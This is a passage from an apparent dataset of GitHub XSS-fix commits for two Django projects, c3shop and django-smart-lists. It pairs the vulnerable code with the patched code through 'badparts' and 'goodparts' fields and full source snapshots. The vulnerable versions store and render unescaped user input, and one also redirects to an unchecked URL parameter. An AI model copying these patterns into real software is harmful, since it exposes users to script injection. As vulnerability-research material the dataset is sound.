SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n-                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n+                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))\n                 ar.save()\n     if \"srid\" in request.GET:\n         response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n", "add": 1, "remove": 1, "filename": "/c3shop/frontpage/management/reservation_actions.py", "badparts": ["                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])"], "goodparts": ["                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))"]}, {"diff": "\n         else:\n             sr = SubReservation.objects.get(id=srid)\n         if request.POST.get(\"notes\"):\n-            sr.notes = request.POST[\"notes\"]\n+            sr.notes = escape(request.POST[\"notes\"])\n         else:\n             sr.notes = \" \"\n         sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n", "add": 1, "remove": 1, "filename": "/c3shop/frontpage/management/reservation_actions.py", "badparts": ["            sr.notes = request.POST[\"notes\"]"], "goodparts": ["            sr.notes = escape(request.POST[\"notes\"])"]}, {"diff": "\n     else:\n         return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n     if request.POST.get(\"notes\"):\n-        r.notes = request.POST[\"notes\"]\n+        r.notes = escape(request.POST[\"notes\"])\n     if request.POST.get(\"contact\"):\n-        r.responsiblePerson = str(request.POST[\"contact\"])\n+        r.responsiblePerson = escape(str(request.POST[\"contact\"]))\n     if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n         r.save()\n     else:\n", "add": 2, "remove": 2, "filename": "/c3shop/frontpage/management/reservation_actions.py", "badparts": ["        r.notes = request.POST[\"notes\"]", "        r.responsiblePerson = str(request.POST[\"contact\"])"], "goodparts": ["        r.notes = escape(request.POST[\"notes\"])", "        r.responsiblePerson = escape(str(request.POST[\"contact\"]))"]}], "source": "\nfrom django.http import HttpRequest, HttpResponseRedirect from..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop.frontpage\" +\\ \".reservation.cookiekey\" EMPTY_COOKY_VALUE: str=''' { \"notes\": \"\", \"articles\":[], \"pickup_date\": \"\" } ''' def update_reservation_articles(postdict, rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url: str): forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int(request.GET.get(\"article_id\")) quantity: int=int(request.POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.amount=quantity ar.notes=notes ar.save() else: if \"group_id\" not in request.GET: return HttpResponseRedirect(\"/admin?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects.get(id=int(request.GET[\"group_id\"])) for art in Article.objects.all().filter(group=g): if str(\"quantity_\" +str(art.id)) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"&srid=\" +request.GET[\"srid\"]) else: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u.rights > 0: forward_url=\"/admin/reservations\" if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"payload\" not in request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and u. rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready=False r.open=True r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r.id)) return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article from the reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user(request) if \"rid\" in request.GET: if \"srid\" in request.GET: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") if request.GET.get(\"id\"): aid: ArticleRequested=ArticleRequested.objects.get(id=int(request.GET[\"id\"])) r: GroupReservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete() else: return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\") return response ", "sourceWithComments": "from django.http import HttpRequest, HttpResponseRedirect\n# from django.shortcuts import redirect\nfrom ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\nfrom .magic import get_current_user\nimport json\nimport datetime\n\nRESERVATION_CONSTRUCTION_COOKIE_KEY: str = \"org.technikradio.c3shop.frontpage\" + \\\n        \".reservation.cookiekey\"\nEMPTY_COOKY_VALUE: str = '''\n{\n\"notes\": \"\",\n\"articles\": [],\n\"pickup_date\": \"\"\n}\n'''\n\n\ndef update_reservation_articles(postdict, rid):\n    res: GroupReservation = GroupReservation.objects.get(id=rid)\n\n\n\ndef add_article_action(request: HttpRequest, default_foreward_url: str):\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    else:\n        forward_url = \"/admin\"\n    if \"rid\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    u: Profile = get_current_user(request)\n    current_reservation = GroupReservation.objects.get(id=str(request.GET[\"rid\"]))\n    if current_reservation.createdByUser != u and u.rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    if current_reservation.submitted == True:\n        return HttpResponseRedirect(\"/admin?error=Already%20submitted\")\n    # Test for multiple or single article\n    if \"article_id\" in request.POST:\n        # Actual adding of article\n        aid: int = int(request.GET.get(\"article_id\"))\n        quantity: int = int(request.POST[\"quantity\"])\n        notes: str = request.POST[\"notes\"]\n        ar = ArticleRequested()\n        ar.AID = Article.objects.get(id=aid)\n        ar.RID = current_reservation\n        if \"srid\" in request.GET:\n            ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n        ar.amount = quantity\n        ar.notes = notes\n        ar.save()\n    # Actual adding of multiple articles\n    else:\n        if \"group_id\" not in request.GET:\n            return HttpResponseRedirect(\"/admin?error=missing%20group%20id\")\n        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[\"group_id\"]))\n        for art in Article.objects.all().filter(group=g):\n            if str(\"quantity_\" + str(art.id)) not in request.POST or str(\"notes_\" + str(art.id)) not in request.POST:\n                return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\")\n            amount = int(request.POST[\"quantity_\" + str(art.id)])\n            if amount > 0:\n                ar = ArticleRequested()\n                ar.AID = art\n                ar.RID = current_reservation\n                ar.amount = amount\n                if \"srid\" in request.GET:\n                    ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n                ar.save()\n    if \"srid\" in request.GET:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n    else:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id))\n    return response\n\n\ndef write_db_reservation_action(request: HttpRequest):\n    \"\"\"\n    This function is used to submit the reservation\n    \"\"\"\n    u: Profile = get_current_user(request)\n    forward_url = \"/admin?success\"\n    if u.rights > 0:\n        forward_url = \"/admin/reservations\"\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"payload\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=No%20id%20provided\")\n    current_reservation = GroupReservation.objects.get(id=int(request.GET[\"payload\"]))\n    if current_reservation.createdByUser != u and u. rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    current_reservation.submitted = True\n    current_reservation.save()\n    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)\n    return res\n\n\ndef manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):\n    \"\"\"\n    This function is used to alter the reservation beeing build inside\n    a cookie. This function automatically crafts the required response.\n    \"\"\"\n    js_string: str = \"\"\n    r: GroupReservation = None\n    u: Profile = get_current_user(request)\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"srid\" in request.GET:\n        if not request.GET.get(\"rid\"):\n            return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\")\n        srid: int = int(request.GET[\"srid\"])\n        sr: SubReservation = None\n        if srid == 0:\n            sr = SubReservation()\n        else:\n            sr = SubReservation.objects.get(id=srid)\n        if request.POST.get(\"notes\"):\n            sr.notes = request.POST[\"notes\"]\n        else:\n            sr.notes = \" \"\n        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        sr.save()\n        print(request.POST)\n        print(sr.notes)\n        return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \"&srid=\" + str(sr.id))\n    if \"rid\" in request.GET:\n        # update reservation\n        r = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():\n        r = GroupReservation()\n        r.createdByUser = u\n        r.ready = False\n        r.open = True\n        r.pickupDate = datetime.datetime.now()\n    else:\n        return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n    if request.POST.get(\"notes\"):\n        r.notes = request.POST[\"notes\"]\n    if request.POST.get(\"contact\"):\n        r.responsiblePerson = str(request.POST[\"contact\"])\n    if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n        r.save()\n    else:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + \"?rid=\" + str(r.id))\n    return response\n\n\ndef action_delete_article(request: HttpRequest):\n    \"\"\"\n    This function removes an article from the reservation and returnes\n    the required resonse.\n    \"\"\"\n    u: Profile = get_current_user(request)\n    if \"rid\" in request.GET:\n        if \"srid\" in request.GET:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \\\n                    '&srid=' + str(int(request.GET['srid'])))\n        else:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])))\n    else:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    if request.GET.get(\"id\"):\n        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[\"id\"]))\n        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:\n            aid.delete()\n        else:\n            return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\")\n    return response\n"}}, "msg": "fix: XSS bug in now exposed user forms"}}, "https://github.com/plecto/django-smart-lists": {"44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3": {"url": "https://api.github.com/repos/plecto/django-smart-lists/commits/44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3", "html_url": "https://github.com/plecto/django-smart-lists/commit/44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3", "message": "fix XSS vulnerability in render_function", "sha": "44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3", "keyword": "XSS fix", "diff": "diff --git a/smart_lists/helpers.py b/smart_lists/helpers.py\nindex d31b54b..eb10798 100644\n--- a/smart_lists/helpers.py\n+++ b/smart_lists/helpers.py\n@@ -49,12 +49,18 @@ def __init__(self, smart_list_item, column, object):\n         self.object = object\n \n     def get_value(self):\n-        if self.column.render_function:\n-            # We don't want to escape our html\n-            return self.column.render_function(self.object)\n-\n         field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n-        if type(self.object) == dict:\n+        if self.column.render_function:\n+            template = self.column.render_function(self.object)\n+            if not self.is_template_instance(template):\n+                raise SmartListException(\n+                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(\n+                        self.column.render_function.__name__,\n+                        type(template),\n+                    )\n+                )\n+            value = template.render()\n+        elif type(self.object) == dict:\n             value = self.object.get(self.column.field_name)\n         elif callable(field):\n             value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n@@ -62,7 +68,20 @@ def get_value(self):\n             display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n             value = display_function() if display_function else field\n \n-        return escape(value)\n+        return value\n+\n+    def is_template_instance(self, obj):\n+        \"\"\"Check if given object is object of Template.\"\"\"\n+        from django.template import Template as Template\n+        from django.template.backends.django import Template as DjangoTemplate\n+        from django.template.backends.jinja2 import Template as Jinja2Template\n+\n+        return (\n+            isinstance(obj, Template)\n+            or isinstance(obj, DjangoTemplate)\n+            or isinstance(obj, Jinja2Template)\n+        )\n+\n \n     def format(self, value):\n         if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\ndiff --git a/smart_lists/templates/smart_lists/smart_list.html b/smart_lists/templates/smart_lists/smart_list.html\nindex 6be5cb9..bde853b 100644\n--- a/smart_lists/templates/smart_lists/smart_list.html\n+++ b/smart_lists/templates/smart_lists/smart_list.html\n@@ -53,7 +53,7 @@\n                         {% if forloop.first %}\n                             <a href=\"{{ field.object.get_absolute_url }}\" class=\"{{ table_link_class }}\">{{ field.get_value }}</a>\n                         {% else %}\n-                            {{ field.get_value|safe }}\n+                            {{ field.get_value }}\n                         {% endif %}\n                     </td>\n                     {% endfor %}\n", "files": {"/smart_lists/helpers.py": {"changes": [{"diff": "\n         self.object = object\n \n     def get_value(self):\n-        if self.column.render_function:\n-            # We don't want to escape our html\n-            return self.column.render_function(self.object)\n-\n         field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n-        if type(self.object) == dict:\n+        if self.column.render_function:\n+            template = self.column.render_function(self.object)\n+            if not self.is_template_instance(template):\n+                raise SmartListException(\n+                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(\n+                        self.column.render_function.__name__,\n+                        type(template),\n+                    )\n+                )\n+            value = template.render()\n+        elif type(self.object) == dict:\n             value = self.object.get(self.column.field_name)\n         elif callable(field):\n             value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n", "add": 11, "remove": 5, "filename": "/smart_lists/helpers.py", "badparts": ["        if self.column.render_function:", "            return self.column.render_function(self.object)", "        if type(self.object) == dict:"], "goodparts": ["        if self.column.render_function:", "            template = self.column.render_function(self.object)", "            if not self.is_template_instance(template):", "                raise SmartListException(", "                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(", "                        self.column.render_function.__name__,", "                        type(template),", "                    )", "                )", "            value = template.render()", "        elif type(self.object) == dict:"]}, {"diff": "\n             display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n             value = display_function() if display_function else field\n \n-        return escape(value)\n+        return value\n+\n+    def is_template_instance(self, obj):\n+        \"\"\"Check if given object is object of Template.\"\"\"\n+        from django.template import Template as Template\n+        from django.template.backends.django import Template as DjangoTemplate\n+        from django.template.backends.jinja2 import Template as Jinja2Template\n+\n+        return (\n+            isinstance(obj, Template)\n+            or isinstance(obj, DjangoTemplate)\n+            or isinstance(obj, Jinja2Template)\n+        )\n+\n \n     def format(self, value):\n         if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):", "add": 14, "remove": 1, "filename": "/smart_lists/helpers.py", "badparts": ["        return escape(value)"], "goodparts": ["        return value", "    def is_template_instance(self, obj):", "        \"\"\"Check if given object is object of Template.\"\"\"", "        from django.template import Template as Template", "        from django.template.backends.django import Template as DjangoTemplate", "        from django.template.backends.jinja2 import Template as Jinja2Template", "        return (", "            isinstance(obj, Template)", "            or isinstance(obj, DjangoTemplate)", "            or isinstance(obj, Jinja2Template)", "        )"]}], "source": "\nimport datetime from django.core.exceptions import FieldDoesNotExist from django.db.models import BooleanField, ForeignKey from django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field, 'short_description', False): return field.short_description return self.field_name.replace(\"_\", \" \").title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates', False) else field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format(self, value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return value def render(self): return format_html( '<td>{}</td>', self.format(self.get_value()) ) def render_link(self): if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url()\".format(type(self.object))) return format_html( '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param): self.query_params=query_params self.column_id=column_id self.ordering_query_param=ordering_query_param self.query_order=query_params.get(ordering_query_param) self.current_columns=[int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): return True return False def get_add_sort_by(self): if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_reverse_sort_by() def get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model=model self.field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and self.field_name !=\"__str__\": raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field(self.field_name) self.order_field=self.field_name except FieldDoesNotExist: self.model_field=None try: field=getattr(self.model, self.field_name) if callable(field) and getattr(field, 'admin_order_field', False): self.order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue(QueryParamsMixin, object): def __init__(self, field_name, label, value, query_params): self.field_name=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value }) def is_active(self): if self.field_name in self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model, field, query_params, object_list): self.model=model if isinstance(field, SmartListFilter): self.field_name=field.parameter_name self.model_field=field else: self.field_name=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title(self): if isinstance(self.model_field, SmartListFilter): return self.model_field.title return super(SmartFilter, self).get_title() def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups() ] elif self.model_field.choices: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs ] return[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param, '') self.ordering_query_param=ordering_query_param self.columns=self.get_columns() self.filters=[ SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index, field in enumerate(self.list_display, start=1): kwargs={ 'model': self.model, 'column_id': index, 'query_params': self.query_params, 'ordering_query_param': self.ordering_query_param, } try: field, label=field except(TypeError, ValueError): kwargs['field']=field else: if callable(field): kwargs['field'], kwargs['render_function'], kwargs['label']=None, field, label else: kwargs['field'], kwargs['label']=field, label columns.append(SmartColumn(**kwargs)) return columns @property def items(self): return[ SmartListItem(self, obj) for obj in self.object_list ] ", "sourceWithComments": "import datetime\n\nfrom django.core.exceptions import FieldDoesNotExist\nfrom django.db.models import BooleanField, ForeignKey\nfrom django.utils.formats import localize\nfrom django.utils.html import format_html, escape\nfrom django.utils.http import urlencode\nfrom django.utils.translation import gettext_lazy as _\nfrom typing import List\n\nfrom smart_lists.exceptions import SmartListException\nfrom smart_lists.filters import SmartListFilter\n\n\nclass TitleFromModelFieldMixin(object):\n    def get_title(self):\n        if self.label:\n            return self.label\n        elif self.model_field:\n            return self.model_field.verbose_name.title()\n        elif self.field_name == '__str__':\n            return self.model._meta.verbose_name.title()\n        try:\n            field = getattr(self.model, self.field_name)\n        except AttributeError as e:\n            return self.field_name.title()\n        if callable(field) and getattr(field, 'short_description', False):\n            return field.short_description\n        return self.field_name.replace(\"_\", \" \").title()\n\n\nclass QueryParamsMixin(object):\n    def get_url_with_query_params(self, new_query_dict):\n        query = dict(self.query_params).copy()\n        for key, value in query.items():\n            if type(value) == list:\n                query[key] = value[0]\n        query.update(new_query_dict)\n        for key, value in query.copy().items():\n            if value is None:\n                del query[key]\n        return '?{}'.format(urlencode(query))\n\n\nclass SmartListField(object):\n    def __init__(self, smart_list_item, column, object):\n        self.smart_list_item = smart_list_item\n        self.column = column\n        self.object = object\n\n    def get_value(self):\n        if self.column.render_function:\n            # We don't want to escape our html\n            return self.column.render_function(self.object)\n\n        field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n        if type(self.object) == dict:\n            value = self.object.get(self.column.field_name)\n        elif callable(field):\n            value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n        else:\n            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n            value = display_function() if display_function else field\n\n        return escape(value)\n\n    def format(self, value):\n        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\n            return localize(value)\n        return value\n\n    def render(self):\n        return format_html(\n            '<td>{}</td>', self.format(self.get_value())\n        )\n\n    def render_link(self):\n        if not hasattr(self.object, 'get_absolute_url'):\n            raise SmartListException(\"Please make sure your model {} implements get_absolute_url()\".format(type(self.object)))\n        return format_html(\n            '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())\n        )\n\n\nclass SmartListItem(object):\n    def __init__(self, smart_list, object):\n        self.smart_list = smart_list\n        self.object = object\n\n    def fields(self):\n        return [\n            SmartListField(self, column, self.object) for column in self.smart_list.columns\n        ]\n\n\nclass SmartOrder(QueryParamsMixin, object):\n    def __init__(self, query_params, column_id, ordering_query_param):\n        self.query_params = query_params\n        self.column_id = column_id\n        self.ordering_query_param = ordering_query_param\n        self.query_order = query_params.get(ordering_query_param)\n        self.current_columns = [int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else []\n        self.current_columns_length = len(self.current_columns)\n\n    @property\n    def priority(self):\n        if self.is_ordered():\n            return self.current_columns.index(self.column_id) + 1\n\n    def is_ordered(self):\n        return self.column_id in self.current_columns\n\n    def is_reverse(self):\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    return True\n        return False\n\n    def get_add_sort_by(self):\n        if not self.is_ordered():\n            if self.query_order:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: self.column_id\n                })\n        elif self.current_columns_length > 1:\n            new_query = []\n            for column in self.query_order.split('.'):\n                c = column.replace(\"-\", \"\")\n                if not int(c) == self.column_id:\n                    new_query.append(column)\n            if not self.is_reverse() and self.current_columns[0] == self.column_id:\n                